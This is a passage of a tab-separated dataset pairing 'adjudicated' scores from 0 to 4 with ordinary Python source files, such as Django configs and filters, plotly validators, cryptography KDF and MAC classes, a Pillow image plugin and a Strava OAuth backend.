Depends(get_current_user_authorizer()),<<NEWL>>) -> None:<<NEWL>>    if not check_user_can_modify_item(current_item, user):<<NEWL>>        raise HTTPException(<<NEWL>>            status_code=status.HTTP_403_FORBIDDEN,<<NEWL>>            detail=strings.USER_IS_NOT_SELLER_OF_ITEM,<<NEWL>>        )
166	adjudicated	2	"__all__ = ['Version']<<NEWL>><<NEWL>><<NEWL>>import typing as t<<NEWL>><<NEWL>>from ..function import deprecated_classmethod<<NEWL>><<NEWL>>if t.TYPE_CHECKING:<<NEWL>>    import typing_extensions as te<<NEWL>><<NEWL>><<NEWL>>class Version(t.NamedTuple):<<NEWL>>    '''Version named tuple<<NEWL>><<NEWL>>    Example:<<NEWL>>        >>> version = Version.fromString('1.2.x')<<NEWL>>        >>> version.major, version.minor, version.other, version.micro<<NEWL>>        (1, 2, 'x', None)<<NEWL>>        >>> version.to_string()<<NEWL>>        '1.2.x'<<NEWL>>    '''<<NEWL>><<NEWL>>    major: int<<NEWL>>    minor: int<<NEWL>>    other: t.Optional[str]<<NEWL>><<NEWL>>    def __lt__(self, other: 'te.Self') -> bool:<<NEWL>>        return (self.major, self.minor) < (other.major, other.minor)<<NEWL>><<NEWL>>    def __gt__(self, other: 'te.Self') -> bool:<<NEWL>>        return other.__lt__(self)<<NEWL>><<NEWL>>    def __repr__(self) -> str:<<NEWL>>        return f'Version.fromString({self.to_string()!r})'<<NEWL>><<NEWL>>    def __str__(self) -> str:<<NEWL>>        return self.to_string()<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def fromString(cls, version: str) -> 'te.Self':<<NEWL>>        parts = version.split('.', maxsplit=2)<<NEWL>>        if len(parts) == 2:<<NEWL>>            major, minor = parts<<NEWL>>            other = None<<NEWL>>        elif len(parts) == 3:<<NEWL>>            major, minor, other = parts<<NEWL>>        else:<<NEWL>>            raise Exception(f'""{version}"" is not a valid version string')<<NEWL>>        return cls(int(major), int(minor), other)<<NEWL>><<NEWL>>    @property<<NEWL>>    def micro(self) -> t.Optional[int]:<<NEWL>>        if self.other is not None:<<NEWL>>            parts = self.other.split('.')<<NEWL>>            if parts and parts[0].isdigit():<<NEWL>>                return int(parts[0])<<NEWL>>        return None<<NEWL>><<NEWL>>    @property<<NEWL>>    def micro_int(self) -> int:<<NEWL>>        return self.micro or 0<<NEWL>><<NEWL>>    def to_string(self) -> str:<<NEWL>>        version = f'{self.major}.{self.minor}'<<NEWL>>        if self.other is not None:<<NEWL>>            version += f'.{self.other}'<<NEWL>>        return version<<NEWL>><<NEWL>>    from_string = deprecated_classmethod(fromString)"
77	adjudicated	4	"""""""tst_tc2236_hstvprde_68491 URL Configuration<<NEWL>><<NEWL>>The `urlpatterns` list routes URLs to views. For more information please see:<<NEWL>>    https://docs.djangoproject.com/en/2.2/topics/http/urls/<<NEWL>>Examples:<<NEWL>>Function views<<NEWL>>    1. Add an import:  from my_app import views<<NEWL>>    2. Add a URL to urlpatterns:  path('', views.home, name='home')<<NEWL>>Class-based views<<NEWL>>    1. Add an import:  from other_app.views import Home<<NEWL>>    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')<<NEWL>>Including another URLconf<<NEWL>>    1. Import the include() function: from django.urls import include, path<<NEWL>>    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))<<NEWL>>""""""<<NEWL>><<NEWL>>from django.contrib import admin<<NEWL>>from django.urls import path, include, re_path<<NEWL>>from django.views.generic.base import TemplateView<<NEWL>>from allauth.account.views import confirm_email<<NEWL>>from rest_framework import permissions<<NEWL>>from drf_spectacular.views import SpectacularJSONAPIView, SpectacularSwaggerView<<NEWL>><<NEWL>>urlpatterns = [<<NEWL>>    <<NEWL>>    path(""accounts/"", include(""allauth.urls"")),<<NEWL>>    path(""modules/"", include(""modules.urls"")),<<NEWL>>    path(""api/v1/"", include(""home.api.v1.urls"")),<<NEWL>>    path(""admin/"", admin.site.urls),<<NEWL>>    path(""users/"", include(""users.urls"", namespace=""users"")),<<NEWL>>    path(""rest-auth/"", include(""rest_auth.urls"")),<<NEWL>>    # Override email confirm to use allauth's HTML view instead of rest_auth's API view<<NEWL>>    path(""rest-auth/registration/account-confirm-email/<str:key>/"", confirm_email),<<NEWL>>    path(""rest-auth/registration/"", include(""rest_auth.registration.urls"")),<<NEWL>>]<<NEWL>><<NEWL>>admin.site.site_header = ""TST-TC2236-hstvprdenr""<<NEWL>>admin.site.site_title = ""TST-TC2236-hstvprdenr Admin Portal""<<NEWL>>admin.site.index_title = ""TST-TC2236-hstvprdenr Admin""<<NEWL>><<NEWL>># swagger<<NEWL>>urlpatterns += [<<NEWL>>    path(""api-docs/schema/"", SpectacularJSONAPIView.as_view(), name=""schema""),<<NEWL>>    path(""api-docs/"", SpectacularSwaggerView.as_view(url_name='schema'), name=""api_docs"")<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>urlpatterns += [re_path(r"".*"",TemplateView.as_view(template_name='index.html'))]"
137	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""scatterternary.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
84	adjudicated	4	"# -*- coding: utf-8 -*-<<NEWL>>import re<<NEWL>><<NEWL>>from django.template import Library<<NEWL>>from django.utils.encoding import force_str<<NEWL>><<NEWL>><<NEWL>>register = Library()<<NEWL>>re_widont = re.compile(r'\s+(\S+\s*)$')<<NEWL>>re_widont_html = re.compile(r'([^<>\s])\s+([^<>\s]+\s*)(</?(?:address|blockquote|br|dd|div|dt|fieldset|form|h[1-6]|li|noscript|p|td|th)[^>]*>|$)', re.IGNORECASE)<<NEWL>><<NEWL>><<NEWL>>@register.filter<<NEWL>>def widont(value, count=1):<<NEWL>>    """"""<<NEWL>>    Add an HTML non-breaking space between the final two words of the string to<<NEWL>>    avoid ""widowed"" words.<<NEWL>><<NEWL>>    Examples:<<NEWL>><<NEWL>>    >>> print(widont('Test   me   out'))<<NEWL>>    Test   me&nbsp;out<<NEWL>><<NEWL>>    >>> print(""'"",widont('It works with trailing spaces too  '), ""'"")<<NEWL>>    ' It works with trailing spaces&nbsp;too   '<<NEWL>><<NEWL>>    >>> print(widont('NoEffect'))<<NEWL>>    NoEffect<<NEWL>>    """"""<<NEWL>>    def replace(matchobj):<<NEWL>>        return force_str('&nbsp;%s' % matchobj.group(1))<<NEWL>>    for i in range(count):<<NEWL>>        value = re_widont.sub(replace, force_str(value))<<NEWL>>    return value<<NEWL>><<NEWL>><<NEWL>>@register.filter<<NEWL>>def widont_html(value):<<NEWL>>    """"""<<NEWL>>    Add an HTML non-breaking space between the final two words at the end of<<NEWL>>    (and in sentences just outside of) block level tags to avoid ""widowed""<<NEWL>>    words.<<NEWL>><<NEWL>>    Examples:<<NEWL>><<NEWL>>    >>> print(widont_html('<h2>Here is a simple  example  </h2> <p>Single</p>'))<<NEWL>>    <h2>Here is a simple&nbsp;example  </h2> <p>Single</p><<NEWL>><<NEWL>>    >>> print(widont_html('<p>test me<br /> out</p><h2>Ok?</h2>Not in a p<p title=""test me"">and this</p>'))<<NEWL>>    <p>test&nbsp;me<br /> out</p><h2>Ok?</h2>Not in a&nbsp;p<p title=""test me"">and&nbsp;this</p><<NEWL>><<NEWL>>    >>> print(widont_html('leading text  <p>test me out</p>  trailing text'))<<NEWL>>    leading&nbsp;text  <p>test me&nbsp;out</p>  trailing&nbsp;text<<NEWL>>    """"""<<NEWL>>    def replace(matchobj):<<NEWL>>        return force_str('%s&nbsp;%s%s' % matchobj.groups())<<NEWL>>    return re_widont_html.sub(replace, force_str(value))<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    def _test():<<NEWL>>        import doctest<<NEWL>>        doctest.testmod()<<NEWL>>    _test()"
315	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version<<NEWL>># 2.0, and the BSD License. See the LICENSE file in the root of this repository<<NEWL>># for complete details.<<NEWL>><<NEWL>>import typing<<NEWL>><<NEWL>>from cryptography import utils<<NEWL>>from cryptography.exceptions import (<<NEWL>>    AlreadyFinalized,<<NEWL>>    UnsupportedAlgorithm,<<NEWL>>    _Reasons,<<NEWL>>)<<NEWL>>from cryptography.hazmat.backends.openssl.poly1305 import _Poly1305Context<<NEWL>><<NEWL>><<NEWL>>class Poly1305:<<NEWL>>    _ctx: typing.Optional[_Poly1305Context]<<NEWL>><<NEWL>>    def __init__(self, key: bytes):<<NEWL>>        from cryptography.hazmat.backends.openssl.backend import backend<<NEWL>><<NEWL>>        if not backend.poly1305_supported():<<NEWL>>            raise UnsupportedAlgorithm(<<NEWL>>                ""poly1305 is not supported by this version of OpenSSL."",<<NEWL>>                _Reasons.UNSUPPORTED_MAC,<<NEWL>>            )<<NEWL>>        self._ctx = backend.create_poly1305_ctx(key)<<NEWL>><<NEWL>>    def update(self, data: bytes) -> None:<<NEWL>>        if self._ctx is None:<<NEWL>>            raise AlreadyFinalized(""Context was already finalized."")<<NEWL>>        utils._check_byteslike(""data"", data)<<NEWL>>        self._ctx.update(data)<<NEWL>><<NEWL>>    def finalize(self) -> bytes:<<NEWL>>        if self._ctx is None:<<NEWL>>            raise AlreadyFinalized(""Context was already finalized."")<<NEWL>>        mac = self._ctx.finalize()<<NEWL>>        self._ctx = None<<NEWL>>        return mac<<NEWL>><<NEWL>>    def verify(self, tag: bytes) -> None:<<NEWL>>        utils._check_bytes(""tag"", tag)<<NEWL>>        if self._ctx is None:<<NEWL>>            raise AlreadyFinalized(""Context was already finalized."")<<NEWL>><<NEWL>>        ctx, self._ctx = self._ctx, None<<NEWL>>        ctx.verify(tag)<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def generate_tag(cls, key: bytes, data: bytes) -> bytes:<<NEWL>>        p = Poly1305(key)<<NEWL>>        p.update(data)<<NEWL>>        return p.finalize()<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def verify_tag(cls, key: bytes, data: bytes, tag: bytes) -> None:<<NEWL>>        p = Poly1305(key)<<NEWL>>        p.update(data)<<NEWL>>        p.verify(tag)"
255	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""densitymapbox"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
344	adjudicated	1	"#<<NEWL>># The Python Imaging Library.<<NEWL>># $Id$<<NEWL>>#<<NEWL>># DCX file handling<<NEWL>>#<<NEWL>># DCX is a container file format defined by Intel, commonly used<<NEWL>># for fax applications.  Each DCX file consists of a directory<<NEWL>># (a list of file offsets) followed by a set of (usually 1-bit)<<NEWL>># PCX files.<<NEWL>>#<<NEWL>># History:<<NEWL>># 1995-09-09 fl   Created<<NEWL>># 1996-03-20 fl   Properly derived from PcxImageFile.<<NEWL>># 1998-07-15 fl   Renamed offset attribute to avoid name clash<<NEWL>># 2002-07-30 fl   Fixed file handling<<NEWL>>#<<NEWL>># Copyright (c) 1997-98 by Secret Labs AB.<<NEWL>># Copyright (c) 1995-96 by Fredrik Lundh.<<NEWL>>#<<NEWL>># See the README file for information on usage and redistribution.<<NEWL>>#<<NEWL>><<NEWL>>from . import Image<<NEWL>>from ._binary import i32le as i32<<NEWL>>from .PcxImagePlugin import PcxImageFile<<NEWL>><<NEWL>>MAGIC = 0x3ADE68B1  # QUIZ: what's this value, then?<<NEWL>><<NEWL>><<NEWL>>def _accept(prefix):<<NEWL>>    return len(prefix) >= 4 and i32(prefix) == MAGIC<<NEWL>><<NEWL>><<NEWL>>##<<NEWL>># Image plugin for the Intel DCX format.<<NEWL>><<NEWL>><<NEWL>>class DcxImageFile(PcxImageFile):<<NEWL>><<NEWL>>    format = ""DCX""<<NEWL>>    format_description = ""Intel DCX""<<NEWL>>    _close_exclusive_fp_after_loading = False<<NEWL>><<NEWL>>    def _open(self):<<NEWL>><<NEWL>>        # Header<<NEWL>>        s = self.fp.read(4)<<NEWL>>        if not _accept(s):<<NEWL>>            msg = ""not a DCX file""<<NEWL>>            raise SyntaxError(msg)<<NEWL>><<NEWL>>        # Component directory<<NEWL>>        self._offset = []<<NEWL>>        for i in range(1024):<<NEWL>>            offset = i32(self.fp.read(4))<<NEWL>>            if not offset:<<NEWL>>                break<<NEWL>>            self._offset.append(offset)<<NEWL>><<NEWL>>        self._fp = self.fp<<NEWL>>        self.frame = None<<NEWL>>        self.n_frames = len(self._offset)<<NEWL>>        self.is_animated = self.n_frames > 1<<NEWL>>        self.seek(0)<<NEWL>><<NEWL>>    def seek(self, frame):<<NEWL>>        if not self._seek_check(frame):<<NEWL>>            return<<NEWL>>        self.frame = frame<<NEWL>>        self.fp = self._fp<<NEWL>>        self.fp.seek(self._offset[frame])<<NEWL>>        PcxImageFile._open(self)<<NEWL>><<NEWL>>    def tell(self):<<NEWL>>        return self.frame<<NEWL>><<NEWL>><<NEWL>>Image.register_open(DcxImageFile.format, DcxImageFile, _accept)<<NEWL>><<NEWL>>Image.register_extension(DcxImageFile.format, "".dcx"")"
195	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""font"", parent_name=""pie.title"", **kwargs):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
204	adjudicated	2	"from . import engines<<NEWL>>from .exceptions import TemplateDoesNotExist<<NEWL>><<NEWL>><<NEWL>>def get_template(template_name, using=None):<<NEWL>>    """"""<<NEWL>>    Load and return a template for the given name.<<NEWL>><<NEWL>>    Raise TemplateDoesNotExist if no such template exists.<<NEWL>>    """"""<<NEWL>>    chain = []<<NEWL>>    engines = _engine_list(using)<<NEWL>>    for engine in engines:<<NEWL>>        try:<<NEWL>>            return engine.get_template(template_name)<<NEWL>>        except TemplateDoesNotExist as e:<<NEWL>>            chain.append(e)<<NEWL>><<NEWL>>    raise TemplateDoesNotExist(template_name, chain=chain)<<NEWL>><<NEWL>><<NEWL>>def select_template(template_name_list, using=None):<<NEWL>>    """"""<<NEWL>>    Load and return a template for one of the given names.<<NEWL>><<NEWL>>    Try names in order and return the first template found.<<NEWL>><<NEWL>>    Raise TemplateDoesNotExist if no such template exists.<<NEWL>>    """"""<<NEWL>>    if isinstance(template_name_list, str):<<NEWL>>        raise TypeError(<<NEWL>>            ""select_template() takes an iterable of template names but got a ""<<NEWL>>            ""string: %r. Use get_template() if you want to load a single ""<<NEWL>>            ""template by name."" % template_name_list<<NEWL>>        )<<NEWL>><<NEWL>>    chain = []<<NEWL>>    engines = _engine_list(using)<<NEWL>>    for template_name in template_name_list:<<NEWL>>        for engine in engines:<<NEWL>>            try:<<NEWL>>                return engine.get_template(template_name)<<NEWL>>            except TemplateDoesNotExist as e:<<NEWL>>                chain.append(e)<<NEWL>><<NEWL>>    if template_name_list:<<NEWL>>        raise TemplateDoesNotExist("", "".join(template_name_list), chain=chain)<<NEWL>>    else:<<NEWL>>        raise TemplateDoesNotExist(""No template names provided"")<<NEWL>><<NEWL>><<NEWL>>def render_to_string(template_name, context=None, request=None, using=None):<<NEWL>>    """"""<<NEWL>>    Load a template and render it with a context. Return a string.<<NEWL>><<NEWL>>    template_name may be a string or a list of strings.<<NEWL>>    """"""<<NEWL>>    if isinstance(template_name, (list, tuple)):<<NEWL>>        template = select_template(template_name, using=using)<<NEWL>>    else:<<NEWL>>        template = get_template(template_name, using=using)<<NEWL>>    return template.render(context, request)<<NEWL>><<NEWL>><<NEWL>>def _engine_list(using=None):<<NEWL>>    return engines.all() if using is None else [engines[using]]"
103	adjudicated	1	"from minerl.herobraine.hero import handlers<<NEWL>>from typing import List<<NEWL>>from minerl.herobraine.hero.handlers.translation import TranslationHandler<<NEWL>>import time<<NEWL>>from minerl.herobraine.env_specs.navigate_specs import Navigate<<NEWL>><<NEWL>>import coloredlogs<<NEWL>>import logging<<NEWL>><<NEWL>>color = coloredlogs.install(level=logging.DEBUG)<<NEWL>><<NEWL>><<NEWL>># Let's also test monitors<<NEWL>><<NEWL>>class NavigateWithDistanceMonitor(Navigate):<<NEWL>>    def create_monitors(self) -> List[TranslationHandler]:<<NEWL>>        return [<<NEWL>>            handlers.CompassObservation(angle=False, distance=True)<<NEWL>>        ]<<NEWL>><<NEWL>><<NEWL>>def _test_fake_env(env_spec, should_render=False):<<NEWL>>    # Make the env.<<NEWL>>    fake_env = env_spec.make(fake=True)<<NEWL>><<NEWL>>    assert fake_env.action_space == fake_env.task.action_space<<NEWL>>    assert fake_env.observation_space == fake_env.observation_space<<NEWL>><<NEWL>>    assert fake_env._seed == None<<NEWL>><<NEWL>>    fake_env.seed(200)<<NEWL>>    assert fake_env._seed == 200<<NEWL>>    fake_obs = fake_env.reset()<<NEWL>><<NEWL>>    assert fake_obs in env_spec.observation_space<<NEWL>><<NEWL>>    for _ in range(100):<<NEWL>>        fake_obs, _, _, fake_monitor = fake_env.step(fake_env.action_space.sample())<<NEWL>>        if should_render:<<NEWL>>            fake_env.render()<<NEWL>>            time.sleep(0.1)<<NEWL>>        assert fake_obs in env_spec.observation_space<<NEWL>>        assert fake_monitor in env_spec.monitor_space<<NEWL>><<NEWL>><<NEWL>>def test_fake_navigate():<<NEWL>>    _test_fake_env(Navigate(dense=True, extreme=False))<<NEWL>>    _test_fake_env(Navigate(dense=True, extreme=False, agent_count=3))<<NEWL>><<NEWL>><<NEWL>>def test_fake_navigate_with_distance_monitor():<<NEWL>>    task = NavigateWithDistanceMonitor(dense=True, extreme=False)<<NEWL>>    fake_env = task.make(fake=True)<<NEWL>>    _ = fake_env.reset()<<NEWL>><<NEWL>>    for _ in range(100):<<NEWL>>        fake_obs, _, _, fake_monitor = fake_env.step(fake_env.action_space.sample())<<NEWL>>        assert fake_monitor in fake_env.monitor_space<<NEWL>>        assert ""compass"" in fake_monitor<<NEWL>>        assert ""distance"" in fake_monitor[""compass""]<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    # _test_fake_env(Navigate(dense=True, extreme=False), should_render=True)<<NEWL>>    _test_fake_env(Navigate(dense=True, extreme=False, agent_count=3), should_render=True)<<NEWL>>    # test_fake_navigate_with_distance_monitor()"
292	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version<<NEWL>># 2.0, and the BSD License. See the LICENSE file in the root of this repository<<NEWL>># for complete details.<<NEWL>><<NEWL>><<NEWL>>import typing<<NEWL>><<NEWL>>from cryptography import utils<<NEWL>>from cryptography.exceptions import AlreadyFinalized, InvalidKey<<NEWL>>from cryptography.hazmat.primitives import constant_time, hashes<<NEWL>>from cryptography.hazmat.primitives.kdf import KeyDerivationFunction<<NEWL>><<NEWL>><<NEWL>>def _int_to_u32be(n: int) -> bytes:<<NEWL>>    return n.to_bytes(length=4, byteorder=""big"")<<NEWL>><<NEWL>><<NEWL>>class X963KDF(KeyDerivationFunction):<<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        algorithm: hashes.HashAlgorithm,<<NEWL>>        length: int,<<NEWL>>        sharedinfo: typing.Optional[bytes],<<NEWL>>        backend: typing.Any = None,<<NEWL>>    ):<<NEWL>>        max_len = algorithm.digest_size * (2**32 - 1)<<NEWL>>        if length > max_len:<<NEWL>>            raise ValueError(<<NEWL>>                ""Cannot derive keys larger than {} bits."".format(max_len)<<NEWL>>            )<<NEWL>>        if sharedinfo is not None:<<NEWL>>            utils._check_bytes(""sharedinfo"", sharedinfo)<<NEWL>><<NEWL>>        self._algorithm = algorithm<<NEWL>>        self._length = length<<NEWL>>        self._sharedinfo = sharedinfo<<NEWL>>        self._used = False<<NEWL>><<NEWL>>    def derive(self, key_material: bytes) -> bytes:<<NEWL>>        if self._used:<<NEWL>>            raise AlreadyFinalized<<NEWL>>        self._used = True<<NEWL>>        utils._check_byteslike(""key_material"", key_material)<<NEWL>>        output = [b""""]<<NEWL>>        outlen = 0<<NEWL>>        counter = 1<<NEWL>><<NEWL>>        while self._length > outlen:<<NEWL>>            h = hashes.Hash(self._algorithm)<<NEWL>>            h.update(key_material)<<NEWL>>            h.update(_int_to_u32be(counter))<<NEWL>>            if self._sharedinfo is not None:<<NEWL>>                h.update(self._sharedinfo)<<NEWL>>            output.append(h.finalize())<<NEWL>>            outlen += len(output[-1])<<NEWL>>            counter += 1<<NEWL>><<NEWL>>        return b"""".join(output)[: self._length]<<NEWL>><<NEWL>>    def verify(self, key_material: bytes, expected_key: bytes) -> None:<<NEWL>>        if not constant_time.bytes_eq(self.derive(key_material), expected_key):<<NEWL>>            raise InvalidKey"
43	adjudicated	4	"""""""<<NEWL>>Strava OAuth2 backend, docs at:<<NEWL>>    https://python-social-auth.readthedocs.io/en/latest/backends/strava.html<<NEWL>>""""""<<NEWL>>from .oauth import BaseOAuth2<<NEWL>><<NEWL>><<NEWL>>class StravaOAuth(BaseOAuth2):<<NEWL>>    name = 'strava'<<NEWL>>    AUTHORIZATION_URL = 'https://www.strava.com/oauth/authorize'<<NEWL>>    ACCESS_TOKEN_URL = 'https://www.strava.com/oauth/token'<<NEWL>>    ACCESS_TOKEN_METHOD = 'POST'<<NEWL>>    # Strava doesn't check for parameters in redirect_uri and directly appends<<NEWL>>    # the auth parameters to it, ending with an URL like:<<NEWL>>    # http://example.com/complete/strava?redirect_state=xxx?code=xxx&state=xxx<<NEWL>>    # Check issue #259 for details.<<NEWL>>    REDIRECT_STATE = False<<NEWL>>    REVOKE_TOKEN_URL = 'https://www.strava.com/oauth/deauthorize'<<NEWL>>    SCOPE_SEPARATOR = ','<<NEWL>>    EXTRA_DATA = [<<NEWL>>        ('refresh_token', 'refresh_token'),<<NEWL>>        ('expires_in', 'expires'),<<NEWL>>    ]<<NEWL>><<NEWL>>    def get_user_id(self, details, response):<<NEWL>>        return response['athlete']['id']<<NEWL>><<NEWL>>    def get_user_details(self, response):<<NEWL>>        """"""Return user details from Strava account""""""<<NEWL>>        username = response['athlete'].get('username', '')<<NEWL>>        fullname, first_name, last_name = self.get_user_names(<<NEWL>>            first_name=response['athlete'].get('firstname', ''),<<NEWL>>            last_name=response['athlete'].get('lastname', ''),<<NEWL>>        )<<NEWL>>        return {'username': username,<<NEWL>>                'fullname': fullname,<<NEWL>>                'first_name': first_name,<<NEWL>>                'last_name': last_name}<<NEWL>><<NEWL>>    def user_data(self, access_token, *args, **kwargs):<<NEWL>>        """"""Loads user data from service""""""<<NEWL>>        return self.get_json('https://www.strava.com/api/v3/athlete',<<NEWL>>                             params={'access_token': access_token})<<NEWL>><<NEWL>>    def revoke_token_params(self, token, uid):<<NEWL>>        params = super().revoke_token_params(token, uid)<<NEWL>>        params['access_token'] = token<<NEWL>>        return params"
152	adjudicated	2	"import os<<NEWL>>import shutil<<NEWL>>import tempfile<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>from pathy import Pathy<<NEWL>><<NEWL>>is_windows = os.name == ""nt""<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.skipif(not is_windows, reason=""requires windows"")<<NEWL>>def test_windows_fluid_absolute_paths() -> None:<<NEWL>>    # Path with \\ slashes<<NEWL>>    tmp_dir = tempfile.mkdtemp()<<NEWL>>    # Converted to the same path with / slashes<<NEWL>>    alt_slashes = tmp_dir.replace(""\\\\"", ""/"").replace(""\\"", ""/"")<<NEWL>><<NEWL>>    # Make a folder from \\ absolute path<<NEWL>>    fs_root = Pathy.fluid(tmp_dir)<<NEWL>>    assert ""\\"" in str(fs_root), ""expected \\ separators in windows path""<<NEWL>>    new_folder = Pathy.fluid(fs_root / ""sub-dir"")<<NEWL>>    assert new_folder.exists() is False<<NEWL>>    new_folder.mkdir()<<NEWL>>    assert new_folder.exists() is True<<NEWL>><<NEWL>>    # Make a folder from / absolute path<<NEWL>>    fs_root = Pathy.fluid(alt_slashes)<<NEWL>>    new_folder = Pathy.fluid(fs_root / ""sub-dir-alt"")<<NEWL>>    assert new_folder.exists() is False<<NEWL>>    new_folder.mkdir()<<NEWL>>    assert new_folder.exists() is True<<NEWL>><<NEWL>>    shutil.rmtree(tmp_dir)<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.skipif(not is_windows, reason=""requires windows"")<<NEWL>>def test_windows_fluid_absolute_file_paths() -> None:<<NEWL>>    # Path with \\ slashes<<NEWL>>    tmp_dir = tempfile.mkdtemp()<<NEWL>>    # Converted to the same path with / slashes<<NEWL>>    alt_slashes = tmp_dir.replace(""\\\\"", ""/"").replace(""\\"", ""/"")<<NEWL>><<NEWL>>    # Make a folder from \\ absolute path<<NEWL>>    fs_root = Pathy.fluid(f""file://{tmp_dir}"")<<NEWL>>    assert ""\\"" in str(fs_root), ""expected \\ separators in windows path""<<NEWL>>    new_folder = Pathy.fluid(fs_root / 